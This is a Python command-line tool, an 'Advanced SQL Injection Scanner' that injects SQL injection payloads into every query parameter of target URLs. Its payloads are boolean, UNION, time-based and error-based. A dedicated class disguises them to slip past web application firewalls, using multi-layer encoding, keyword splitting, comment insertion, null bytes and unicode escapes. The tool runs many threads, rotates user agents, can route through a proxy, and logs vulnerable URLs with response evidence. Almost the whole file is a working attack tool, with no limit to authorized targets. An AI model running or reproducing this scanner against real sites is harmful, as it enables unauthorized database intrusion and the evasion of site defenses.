#!/usr/bin/env python3
import threading
import argparse
import sys
import random
import requests
import urllib.parse
import base64
import string
import datetime
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

class EnhancedWAFBypass:
    @staticmethod
    def generate_evasion(payload):
        original = payload
        techniques = [
            EnhancedWAFBypass._multi_layer_encoding,
            EnhancedWAFBypass._keyword_fragmentation,
            EnhancedWAFBypass._comment_obfuscation,
            EnhancedWAFBypass._case_permutation,
            EnhancedWAFBypass._null_byte_injection,
            EnhancedWAFBypass._time_based_evasion,
            EnhancedWAFBypass._alternative_syntax,
            EnhancedWAFBypass._unicode_obfuscation
        ]
        for _ in range(random.randint(2, 4)):
            modified = random.choice(techniques)(payload)
            if EnhancedWAFBypass._is_payload_valid(modified):
                payload = modified
        return payload if payload != original else original

    @staticmethod
    def _is_payload_valid(payload):
        return any(re.search(rf'\b{kw}\b', payload, re.IGNORECASE) for kw in ['SELECT', 'UNION', 'OR', 'AND', 'SLEEP'])

    @staticmethod
    def _multi_layer_encoding(payload):
        encodings = [
            lambda x: urllib.parse.quote_plus(x),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            lambda x: ''.join([f'\\u{ord(c):04x}' for c in x])
        ]
        return random.choice(encodings)(payload)

    @staticmethod
    def _keyword_fragmentation(payload):
        fragments = {
            'SELECT': ['SEL/*{}*/ECT', 'SELE%0bCT', '/*!50620SELECT*/'],
            'UNION': ['UNI%0aON', 'UNI%a0ON', 'UNI\ufeffON'],
            'OR': ['O\ue3b2R', 'O\x0aR', '/*!!OR*/'],
            'AND': ['%26%26', 'AN\ue5a9D', 'A%00ND']
        }
        for key, replacements in fragments.items():
            if key in payload.upper():
                payload = payload.replace(key, random.choice(replacements).format(''.join(random.choices(string.ascii_letters, k=3))), 1)
        return payload

    @staticmethod
    def _comment_obfuscation(payload):
        comment_formats = [
            (f'/*{"".join(random.choices(string.printable, k=8))}*/', 0.7),
            ('#{}'.format(''.join(random.choices('\x0a\x0d', k=2))), 0.2),
            ('-- {}'.format(''.join(random.choices('\x00\x1a', k=1))), 0.1)
        ]
        for comment, prob in comment_formats:
            if random.random() < prob:
                payload = payload.replace(' ', comment, 1)
        return payload

    @staticmethod
    def _case_permutation(payload):
        return ''.join(c.upper() if (i % 3 == 0 and random.random() > 0.4) else c.lower() for i, c in enumerate(payload))

    @staticmethod
    def _null_byte_injection(payload):
        return payload[:len(payload)//2] + '%00' + payload[len(payload)//2:]

    @staticmethod
    def _time_based_evasion(payload):
        time_payloads = [
            (f"' XOR SLEEP({random.choice(['5', '7', '9'])})-- ", 0.6),
            (f";WAITFOR DELAY '0:0:{random.randint(3,7)}'--", 0.3),
            (f"||(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--", 0.4)
        ]
        for p, prob in time_payloads:
            if random.random() < prob:
                payload += p
        return payload

    @staticmethod
    def _alternative_syntax(payload):
        replacements = {
            '=': [' LIKE ', ' BETWEEN ', '>', '<>'],
            "'": ["%27", "%ef%bc%87", "''"],
            ' ': ['%09','%0a','%0d','%0c','%0b']
        }
        for char, options in replacements.items():
            payload = payload.replace(char, random.choice(options), 1)
        return payload

    @staticmethod
    def _unicode_obfuscation(payload):
        return ''.join(f'%u{ord(c):04x}' if random.random() < 0.3 else c for c in payload)

class AdvancedSQLiScanner:
    def __init__(self, proxy=None, debug=False):
        self.session = requests.Session()
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.debug = debug
        self.user_agents = self._load_user_agents()
        self.payloads = self._generate_payloads()
        self.tested = {'urls': set(), 'params': 0, 'payloads': 0}
        self.vulnerable = []
        self.lock = threading.Lock()
        self.report_file = "result.txt"
        self.error_pattern = re.compile(r'(SQL syntax|MySQL server version|unclosed quotation|PG::SyntaxError|syntax error near|ODBC Driver|Warning:\smysql_fetch|Unexpected end of command)', re.IGNORECASE)
        self.spinner = ['|', '/', '-', '\\']
        self._print_banner()

    def _print_banner(self):
        print(rf"""{Style.BRIGHT}{Fore.YELLOW}
   __| \ \  / \ |  __|   __| __ __| _ \    \     
 \__ \  \  / .  |  _|  \__ \    |     /   _ \    
 ____/   _| _|\_| ___| ____/   _|  _|_\ _/  _\   
        {Style.RESET_ALL}""")
        print(f"{Style.BRIGHT}{Fore.CYAN}ⓘ Loaded {len(self.payloads)} evasive payloads")
        print(f"ⓘ Scan started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")

    def _load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
        ]

    def _generate_payloads(self):
        base_vectors = [
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' UNION SELECT @@version--",
            "' OR SLEEP(5)#",
            "' AND 1=CONVERT(int,@@version)--"
        ]
        return [EnhancedWAFBypass.generate_evasion(p) for p in base_vectors]

    def _print_status(self, message, msg_type="INFO"):
        colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW}
        with self.lock:
            print(f"\n{Style.BRIGHT}{colors[msg_type]}[{msg_type[0]}] {message}{Style.RESET_ALL}")
            self._update_progress()

    def _update_progress(self):
        spinner_char = self.spinner[self.tested['payloads'] % len(self.spinner)]
        progress = (f"{Style.BRIGHT}{Fore.WHITE}{spinner_char} URLs: {len(self.tested['urls'])} | Params: {self.tested['params']} | Payloads: {self.tested['payloads']} | Hits: {len(self.vulnerable)}{Style.RESET_ALL}")
        sys.stdout.write("\r\033[K" + progress)
        sys.stdout.flush()

    def _print_runtime_output(self, url, param, payload, current, total, status_code, resp_time, vulnerable):
        symbol = f"{Style.BRIGHT}{Fore.GREEN}✔{Style.RESET_ALL}" if vulnerable else f"{Style.BRIGHT}{Fore.WHITE}{'◌' if current % 2 == 1 else '◎'}{Style.RESET_ALL}"
        url_disp = (url[:40] + '..') if len(url) > 42 else url
        payload_disp = (payload[:10] + '...') if len(payload) > 13 else payload
        param_disp = f"{param}: {payload_disp}"
        output_line = (f"\n  {symbol} {Style.BRIGHT}{Fore.MAGENTA}{url_disp:<45}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.CYAN}{param_disp:<25}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.YELLOW}Status: {status_code:<3}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.BLUE}Time: {resp_time:.2f}s{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.WHITE}{current}/{total}{Style.RESET_ALL}")
        with self.lock:
            print(output_line)

    def _analyze_response(self, response, start_time):
        time_delta = time.time() - start_time
        indicators = {
            'error': bool(self.error_pattern.search(response.text)),
            'time_delay': time_delta > 5,
            'content_mismatch': abs(len(response.text) - 2000) > 500
        }
        return any(indicators.values()), time_delta

    def _test_parameter(self, url, param, value, payload, current, total):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        target_url = parsed._replace(query=urlencode({**query, param: payload}, doseq=True)).geturl()
        try:
            start_time = time.time()
            response = self.session.get(
                target_url,
                headers={'User-Agent': random.choice(self.user_agents)},
                proxies=self.proxy,
                timeout=20,
                verify=True,
                allow_redirects=False
            )
            with self.lock:
                self.tested['payloads'] += 1
            is_vulnerable, resp_time = self._analyze_response(response, start_time)
            self._print_runtime_output(url, param, payload, current, total, response.status_code, resp_time, is_vulnerable)
            if is_vulnerable:
                with self.lock:
                    if target_url not in [v['url'] for v in self.vulnerable]:
                        self.vulnerable.append({
                            'url': target_url,
                            'param': param,
                            'payload': payload,
                            'status': response.status_code,
                            'time': resp_time,
                            'evidence': response.text[:300]
                        })
                        self._print_status(f"Vulnerable: {target_url}", "SUCCESS")                        
                        threading.Thread(target=self._save_results, daemon=True).start()
        except Exception as e:
            self._print_status(f"Failed: {str(e)[:50]}", "ERROR")

    def _save_results(self):
        with self.lock:
            if not self.vulnerable:
                return
            with open(self.report_file, 'w') as f:
                f.write("SQL Injection Scan Results\n")
                f.write("="*50 + "\n")
                for idx, vuln in enumerate(self.vulnerable, 1):
                    f.write(f"{idx}. URL: {vuln['url']}\n")
                    f.write(f"   Parameter: {vuln['param']}\n")
                    f.write(f"   Payload: {vuln['payload']}\n")
                    f.write(f"   Status: {vuln['status']} | Response Time: {vuln['time']:.2f}s\n")
                    f.write(f"   Evidence:\n{vuln['evidence']}\n")
                    f.write("-"*50 + "\n")

    def scan(self, url):
        with self.lock:
            if url in self.tested['urls']:
                return
            self.tested['urls'].add(url)
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for param in params:
                with self.lock:
                    self.tested['params'] += 1
                total_payload = len(self.payloads)
                for idx, payload in enumerate(self.payloads, start=1):
                    futures.append(
                        executor.submit(
                            self._test_parameter,
                            url, param, params[param], payload, idx, total_payload
                        )
                    )
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self._print_status(f"Error in future: {str(e)}", "ERROR")
        print()

def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("-u", "--url", help="Target URL to scan")
    parser.add_argument("-F", "--file", action="store_true", help="Scan URLs from urls.txt")
    parser.add_argument("-p", "--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()
    if not args.url and not args.file:
        parser.print_help()
        return
    scanner = AdvancedSQLiScanner(proxy=args.proxy, debug=args.debug)
    try:
        if args.file:
            with open("urls.txt") as f:
                for url in f.read().splitlines():
                    scanner.scan(url.strip())
        else:
            scanner.scan(args.url)
        if scanner.vulnerable:
            print(f"\n{Style.BRIGHT}{Fore.GREEN}✓ Scan completed. Vulnerabilities saved to {scanner.report_file}{Style.RESET_ALL}")
        else:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}ⓘ No vulnerabilities detected{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Style.BRIGHT}{Fore.RED}✗ Scan interrupted! Partial results saved{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Style.BRIGHT}{Fore.RED}⚠ Critical error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()